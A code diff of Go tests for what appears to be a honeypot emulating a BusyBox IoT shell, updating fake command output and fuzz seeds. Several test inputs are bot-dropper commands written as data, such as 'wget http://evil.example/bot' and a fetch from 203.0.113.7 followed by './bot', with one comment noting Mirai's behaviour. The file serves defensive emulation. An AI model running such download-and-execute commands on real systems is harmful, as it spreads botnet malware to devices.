@@ -28,13 +28,15 @@ func TestRun(t *testing.T) {
 		{"echo -n done", "done"},
 		{"/bin/busybox ECCHI", "ECCHI: applet not found\n"},
 		{"busybox echo hello", "hello\n"},
-		{"wget http://evil.example/bot && echo never-printed", "wget: can't connect to remote host: Connection timed out\n"},
+		{"wget http://evil.example/bot && echo never-printed", "wget: bad address 'evil.example'\n"}, // no DNS
+		{"wget http://203.0.113.7/bot && echo never-printed", "Connecting to 203.0.113.7 (203.0.113.7:80)\n" +
+			"wget: can't connect to remote host (203.0.113.7): Connection timed out\n"},
 		{"ls /var", "log    run    spool  tmp    www\n"},
 		{"cd /tmp; touch a; mkdir b; ls", "a  b\n"},
 		{"echo kami > /tmp/.x; cat /tmp/.x; rm /tmp/.x; cat /tmp/.x", "kami\ncat: can't open '/tmp/.x': No such file or directory\n"},
 		{"echo one > f; echo two >> f; cat f", "one\ntwo\n"},
 		{"echo hi > /missing/file", "-sh: can't create /missing/file: nonexistent directory\n"},
-		{"cd /tmp; wget http://x/bot -O - > bot; cat bot; ls", "wget: can't connect to remote host: Connection timed out\nbot\n"},
+		{"cd /tmp; wget http://x/bot -O - > bot; cat bot; ls", "wget: bad address 'x'\nbot\n"},
 		{"cat /missing > f 2>/dev/null; ls", "f\n"},
 		{"cat /tmp", "cat: read error: Is a directory\n"},
 		{"./bot", "-sh: ./bot: not found\n"},
@@ -57,7 +59,7 @@ func TestRun(t *testing.T) {
 		{"cat /proc/version", "Linux version 4.14.180 (builder@buildhost) (gcc version 8.3.0 (Buildroot 2019.05.3)) #1 SMP Thu Jun  4 12:00:00 UTC 2020\n"},
 		{"cat /etc/os-release | grep PRETTY", "PRETTY_NAME=\"Buildroot 2019.05.3\"\n"}, // a link to /usr/lib/os-release
 		{"cat /bin/echo", elfHeader}, // a link to busybox: Mirai reads the ELF header through it
-		{"/usr/bin/wget http://x/bot", "wget: can't connect to remote host: Connection timed out\n"},
+		{"/usr/bin/wget http://x/bot", "wget: bad address 'x'\n"},
 		{"cd /bin; ./ls /var", "log    run    spool  tmp    www\n"},
 		{"/sbin/init", "init: must be run as PID 1\n"},
 		{"cat /var/run/dropbear.pid", "341\n"},
@@ -625,6 +627,10 @@ func FuzzRun(f *testing.F) {
 		`printf '%-5.2s|%05d|%x|%b|%c|%q' a 1 2 'a\tb' xyz; [ -f /etc/passwd -a ! -d /x ] && test 1 -le 2 -o x = y`,
 		`date -u -d @86400 '+%A %j %Z %z %s'; grep -rnw -m1 -e root -e '[[:digit:]]\{3\}' /etc; head -c 5 /etc/hosts; tail -n +2 -c +3 /etc/hosts`,
 		`env -i A=1 env; which ls nosuch; type cd ls x; command -v sh; read a b < /etc/hosts; echo $a; seq -s, -w 3 -1 -9; history`,
+		// downloads, uname, hostname, sysctl, /proc (6c)
+		`wget -qnv --out=x -T 5 --no -U a 'http://u@[::1]:80/a?b' ftp://h:0/ 1.2.3.4:x; tftp -g -r a/b -l - -b 512 gateway 69`,
+		`ftpget -v -P 21 -u a -p b localhost x y; uname -snrvmpio --mach --k -a; hostname -F /etc/hosts; hostname -fids`,
+		`sysctl -w a.b..c=0x1f vm.swappiness=-0 -n -e -q; sysctl -p /etc/hosts; sysctl -a; echo 010 > /proc/sys/kernel/pid_max`,
 	} {
 		f.Add(seed)
 	}
@@ -746,7 +752,7 @@ func TestLs(t *testing.T) {
 			"-r--r--r--    1 root     root             0 Nov 18 09:15 /proc/cpuinfo\n" +
 				"lrwxrwxrwx    1 root     root            17 Jun  4  2020 /usr/bin/wget -> ../../bin/busybox\n"},
 		{"ls -ld /tmp /proc",
-			"dr-xr-xr-x    2 root     root             0 Nov 18 09:15 /proc\n" +
+			"dr-xr-xr-x    3 root     root             0 Nov 18 09:15 /proc\n" + // its directory: sys
 				"drwxrwxrwt    2 root     root            40 Nov 18 09:15 /tmp\n"},
 		{nippon + "ls -la",
 			"drwxrwxrwt    3 root     root            80 Nov 18 09:15 .\n" +
@@ -822,8 +828,9 @@ func TestBusyboxHelp(t *testing.T) {
 		"\t[, [[, ash, awk, cat, chmod, cp, crontab, cut, date, df, echo, egrep,\n" +
 		"\tenv, false, fgrep, free, ftpget, grep, head, hostname, id, init, kill,\n" +
 		"\tkillall, klogd, login, ls, mkdir, mv, nohup, nproc, printf, ps, pwd,\n" +
-		"\trm, sed, seq, sh, sleep, sort, syslogd, tail, telnetd, test, tftp,\n" +
-		"\ttouch, tr, true, uname, uniq, uptime, w, wc, wget, which, who, whoami\n"
+		"\trm, sed, seq, sh, sleep, sort, sysctl, syslogd, tail, telnetd, test,\n" +
+		"\ttftp, touch, tr, true, uname, uniq, uptime, w, wc, wget, which, who,\n" +
+		"\twhoami\n"
 	if !strings.HasSuffix(out, want) {
 		t.Errorf("applet list:\n%s\nwant:\n%s", out[strings.Index(out, "Currently"):], want)
 	}
